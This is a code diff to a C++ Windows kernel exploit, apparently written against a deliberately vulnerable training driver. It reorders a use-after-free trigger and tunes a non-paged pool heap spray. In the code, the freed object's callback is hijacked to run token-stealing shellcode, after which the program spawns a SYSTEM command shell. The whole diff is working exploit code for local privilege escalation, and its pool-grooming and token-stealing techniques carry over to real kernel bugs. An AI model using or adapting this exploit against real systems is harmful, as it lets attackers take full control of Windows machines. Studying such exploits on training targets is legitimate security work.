@@ -24,12 +24,6 @@ NTSTATUS Solutions::TriggerUAF() {
 	}
 	std::cout << "[+] Allocated UAF object" << std::endl;
 
-	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
-		std::cout << "[-] Could not free UAF object" << std::endl;
-		return STATUS_INVALID_PARAMETER;
-	}
-	std::cout << "[+] Freed UAF object" << std::endl;
-
 	DWORD dwBytesReturned = 0;
 	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
 	if (!lpInBuffer) {
@@ -39,8 +33,15 @@ NTSTATUS Solutions::TriggerUAF() {
 
 	lpInBuffer->callback = (ULONG)&token_stealing_shellcode_write_what_where;
 	memset(lpInBuffer->buf, 0x41, 0x54);
-	std::cout << "[+] token stealing shellcode " << std::hex << (ULONG)&token_stealing_shellcode_write_what_where << std::endl;
+
+	std::cout << "Freeing UAF object" << std::endl;
+	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
+		std::cout << "[-] Could not free UAF object" << std::endl;
+		return STATUS_INVALID_PARAMETER;
+	}
 	
+	// minimum actions between the freeing and the allocation of the fake object
+
 	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
 		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
 		std::cout << "[-] Could not talk with the driver" << std::endl;
@@ -53,9 +54,9 @@ NTSTATUS Solutions::TriggerUAF() {
 		return STATUS_INVALID_PARAMETER;
 	}
 	std::cout << "[+] Calling UAF callback -- enjoy system :)" << std::endl;
-
+	
 	system("cmd.exe");
-
+	
 	return 0;
 }
 
@@ -94,6 +95,7 @@ static NTSTATUS SprayHeap() {
 	std::cout << "[+] Spraying non paged pool with IoCo objects" << std::endl;
 	for (int i = 0; i < 8000 + 5000; i++) {
 		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
+		
 		if (!NT_SUCCESS(status)) {
 			std::cout << "[-] Could not allocate IoCo object - " << GetLastError() << std::endl;
 			return STATUS_NO_MEMORY;
@@ -101,10 +103,12 @@ static NTSTATUS SprayHeap() {
 	}
 
 	std::cout << "[+] Creating holes in the pool" << std::endl;
-	BOOLEAN shouldFree = true;
-	for (int i = 8000; i < 13000; i++) {
-		shouldFree && CloseHandle(hIoCo[i]);
-		shouldFree = !shouldFree;
+	for (int i = 8000; i < 13000; i+=2) {
+		CloseHandle(hIoCo[i]);
+
+		if (i > 12990) {
+			std::cout << hIoCo[i + 1] << std::endl;
+		}
 	}
 
 	return 0; // STATUS_SUCCESS
